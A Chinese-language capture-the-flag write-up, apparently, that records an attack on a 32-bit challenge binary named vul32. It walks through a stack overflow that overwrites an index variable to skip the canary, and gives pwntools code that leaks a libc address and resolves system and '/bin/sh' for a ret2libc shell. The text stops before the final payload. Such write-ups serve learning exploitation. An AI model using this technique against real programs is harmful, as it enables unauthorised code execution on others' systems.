# vul32 攻击记录

## 32-bit 机器

1 字节（byte）= 8 bit
16 进制数（0xa）= 4 bit
16 进制数（0xaa）= 8 bit

char = 1 byte
int = 4 byte
32 位内存空间 = 4 byte

## 分析

首先看下`vul32`的安全保护：

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

## 返回地址覆盖

main 函数栈：

```
$ebp: 0xffffd108
$esp: 0xffffd104
```

dovuln 函数栈：

```
$ebp: 0xffffd0f8
$esp: 0xffffd0b0
```

dovuln()反汇编结果如下，存在漏洞的函数是 read()。read()每次向 buf 中读取 1 字节，之后填入 v3 对应的位置，则我们利用 v3 进行栈溢出。
v3 与 ebp 相距 0x43，则 v3[43]对应的栈处为 ebp，高于 ebp 4 字节处即为返回地址。即我们应该将跳转地址写入 v3[47]，参考 dovuln()代码可知，我们将 v4 的值覆盖为 0x47，ASCII 对应为'G'。

```
int dovuln()
{
  int v0; // eax
  char buf; // [esp+4h] [ebp-44h] BYREF
  char v3[51]; // [esp+5h] [ebp-43h] BYREF
  int v4; // [esp+38h] [ebp-10h]
  unsigned int v5; // [esp+3Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(v3, 0, 0x30u);
  v4 = 0;
  while ( 1 )
  {
    if ( read(0, &buf, 1u) != 1 )
      exit(0);
    if ( buf == 10 )
      break;
    v0 = v4++;
    v3[v0] = buf;
  }
  return puts(v3);
}
```

注意到 v4 低于 ebp 0x10，v3 低于 ebp 0x43，则 v4 高于 v3[0] 0x33。则我们首先填写 0x33 个'a'，随后覆盖 v4 为'G'。首先构造一个输入，观察返回地址是否被正确覆盖：

## system, /bin/sh 地址获取

利用 ROPgadget 搜索发现，libc 库中有`/bin/sh/`可用，因此我们只能调`libc`中的函数来获取 shell。

```
$ ROPgadget --binary libc.so.6 --string '/bin/sh'
Strings information
============================================================
0x0015912b : /bin/sh
```

由于我们已经知道了 vul32 使用的`libc`版本，也就是我们已经知道了函数的偏移量。因此我们只需要求基地址，这里我们泄露`__libc_start_main`的地址，并利用`write()`输出：

```
libc = ELF('./libc.so.6')
vul32 = ELF('./vul32')

write_plt = vul32.plt['write']
libc_start_main_got = vul32.got['__libc_start_main']
main = vul32.symbols['main']

payload = flat(['A' * 0x33, 'G', write_plt, main, p32(1), libc_start_main_got, p32(4)])
sh.sendlineafter('Can you find it !?', payload)
```

获取`__libc_start_main`的地址，计算基地址，并获取`system`和`/bin/sh`的真实地址：

```
libc_start_main_addr = u32(sh.recv()[0:4])
libcbase = libc_start_main_addr - libc.sym['__libc_start_main']

system_addr = libcbase + libc.sym['system']
binsh_addr = libcbase + libc.sym['str_bin_sh']
```

重新获取
